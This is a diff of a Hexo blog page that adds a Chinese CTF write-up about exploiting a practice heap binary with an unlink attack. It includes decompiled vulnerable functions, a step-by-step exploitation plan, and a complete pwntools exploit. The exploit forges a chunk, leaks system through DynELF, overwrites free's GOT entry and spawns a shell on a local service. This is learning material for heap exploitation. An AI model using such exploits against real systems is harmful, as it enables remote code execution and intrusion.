@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="unlink,writeup,pwn,堆利用," />
 
 
 
@@ -81,14 +81,18 @@
 
 
 
+<meta name="description" content="题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。">
+<meta name="keywords" content="unlink,writeup,pwn,堆利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hpasserby">
-<meta property="og:url" content="https://hpasserby.github.io/post/0.html">
+<meta property="og:title" content="unlink例题">
+<meta property="og:url" content="https://hpasserby.github.io/post/503970b4.html">
 <meta property="og:site_name" content="Hpasserby">
+<meta property="og:description" content="题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-10-02T18:11:35.376Z">
+<meta property="og:updated_time" content="2018-10-02T18:26:05.288Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hpasserby">
+<meta name="twitter:title" content="unlink例题">
+<meta name="twitter:description" content="题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。">
 
 
 
@@ -118,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://hpasserby.github.io/post/0.html"/>
+  <link rel="canonical" href="https://hpasserby.github.io/post/503970b4.html"/>
 
 
 
 
 
-  <title> | Hpasserby</title>
+  <title>unlink例题 | Hpasserby</title>
   
 
 
@@ -288,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hpasserby.github.io/post/0.html">
+    <link itemprop="mainEntityOfPage" href="https://hpasserby.github.io/post/503970b4.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hpasserby">
@@ -305,7 +309,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline"></h1>
+          <h1 class="post-title" itemprop="name headline">unlink例题</h1>
         
 
         <div class="post-meta">
@@ -317,7 +321,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-02T03:10:32+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-02T02:26:00+08:00">
                 2018-10-02
               </time>
             
@@ -328,6 +332,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index">
+                    <span itemprop="name">writeups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -335,7 +361,7 @@
 
           
           
-             <span id="/post/0.html" class="leancloud_visitors" data-flag-title="">
+             <span id="/post/503970b4.html" class="leancloud_visitors" data-flag-title="unlink例题">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -366,7 +392,32 @@
       
 
       
-        
+        <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>先运行该程序，发现是一道典型的菜单题，有增删查改功能。<br><a id="more"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap</span><br><span class="line">1.Add chunk</span><br><span class="line">2.Set chunk</span><br><span class="line">3.Delete chunk</span><br><span class="line">4.Print chunk</span><br><span class="line">5.Exit</span><br></pre></td></tr></table></figure>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>其中，<strong>add函数</strong>没有对申请的chunk大小做限制。<br>在<strong>set函数</strong>中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> <span class="built_in">set</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">-1</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Set chunk index:"</span>, <span class="number">0x10</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"Set chunk data error!\n"</span>, <span class="number">0x16</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Set chunk data:"</span>, <span class="number">15u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf[v1], <span class="number">0x400</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以发现代码中没有对写入的长度做限制，<strong>存在溢出</strong><br>同时，buf[]中储存指向chunk的指针，且为<strong>全局变量</strong>，可以获得地址<br>由此确定程序中存在<strong>unlink漏洞</strong></p>
+<p>在<strong>delete函数</strong>中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Delete chunk index:"</span>, <span class="number">0x13</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Delete chunk error!\n"</span>, <span class="number">0x14</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>释放chunk后没有对指针赋0，会造成<strong>UAF漏洞</strong>，但此题不会利用到。</p>
+<p>在print函数中，可输出任意index的chunk，用于<strong>泄露</strong>数据。</p>
+<p>由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li>分配3个连续的chunk，大小为0x80（smallchunk）<br><code>chunk0、chunk1: 用于构造unlink</code><br><code>chunk2：用于防止被top chunk合并</code></li>
+<li>在chunk0中构造fake chunk，<strong>准备unlink</strong>。<br><code>prevsize：0</code><br><code>size：0x80</code><br><code>fd：chunk_ptr - 0xc</code><br><code>bk：chunk_ptr - 0x8</code><br>注意：chunk_ptr是指向<code>chunk0的指针变量所在的地址</code>，即&amp;buf[0]，而非指针指向的地址</li>
+<li>从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）<br><code>prevsize: 0x80</code><br><code>size：0x88</code></li>
+<li>释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc</li>
+<li>写入chunk0，<strong>构造leak函数，准备利用DynELF来泄露system</strong>，由于指针被修改，实际写入地址是chunk_ptr-0xc。<br><code>payload = &#39;a&#39; * 0xc //padding</code><br><code>payload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用</code><br><code>payload += p32(addr) //将addr写入chunk1的指针(buf[1])</code><br>此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取</li>
+<li>利用DynELF<strong>泄露出system</strong>函数地址</li>
+<li>利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将<strong>system的地址写入free的got表</strong></li>
+<li>向chunk2中写入<code>&#39;/bin/sh\x00&#39;</code>，调用<code>free(chunk2)</code>，因为free被覆盖为system，所以实际调用<code>system(chunk2)</code>，成功getshell</li>
+</ol>
+<h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'heap'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">chunk_ptr = <span class="number">0x8049d60</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('heap')</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_chunk</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Input the size of chunk you want to add:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_chunk</span><span class="params">(index, data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Set chunk index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'Set chunk data:'</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Delete chunk index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Print chunk index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	<span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">	payload = <span class="string">'a'</span> * <span class="number">0xc</span> + p32(chunk_ptr<span class="number">-0xc</span>) + p32(addr)</span><br><span class="line">	set_chunk(<span class="number">0</span>, payload)</span><br><span class="line">	res = print_chunk(<span class="number">1</span>)[:<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"leaking: %#x ---&gt; %s"</span> % (addr, res.encode(<span class="string">'hex'</span>))</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">add_chunk(<span class="number">128</span>)</span><br><span class="line">add_chunk(<span class="number">128</span>)</span><br><span class="line">add_chunk(<span class="number">128</span>)</span><br><span class="line">set_chunk(<span class="number">2</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bk</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x80</span>) + p32(chunk_ptr<span class="number">-0xc</span>) + p32(chunk_ptr<span class="number">-0x8</span>)</span><br><span class="line"><span class="comment">#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0</span></span><br><span class="line">payload += <span class="string">'a'</span> * (<span class="number">0x80</span><span class="number">-0x10</span>) + p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</span><br><span class="line">set_chunk(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free第二个chunk，将会触发unlink</span></span><br><span class="line">delete_chunk(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露system的地址</span></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system addr: %#x"</span> % system</span><br><span class="line"></span><br><span class="line"><span class="comment">#将free_got的地址覆盖掉第二个chunk的地址</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xc</span> + p32(chunk_ptr<span class="number">-0xc</span>) + p32(free_got)</span><br><span class="line">set_chunk(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址</span></span><br><span class="line">set_chunk(<span class="number">1</span>, p32(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用free，实际调用system</span></span><br><span class="line">delete_chunk(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
+<li>set_chunk函数中最后应该<strong>用send而非sendline</strong>，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。</li>
+<li>unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值</li>
+<li>此题为32位程序，若是64位应将<code>p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)</code>改为<code>p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10)</code></li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/unlink/t1/heap" target="_blank" rel="noopener">heap</a><br><a href="/post/e7616071.html">HITCON CTF 2014-stkof</a></p>
+
       
     </div>
     
@@ -380,6 +431,18 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/unlink/" rel="tag"># unlink</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/堆利用/" rel="tag"># 堆利用</a>
+          
+        </div>
       
 
       
@@ -457,8 +520,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -518,6 +590,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">2.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我的exp"><span class="nav-number">4.</span> <span class="nav-text">我的exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注意"><span class="nav-number">5.</span> <span class="nav-text">注意</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关链接"><span class="nav-number">6.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
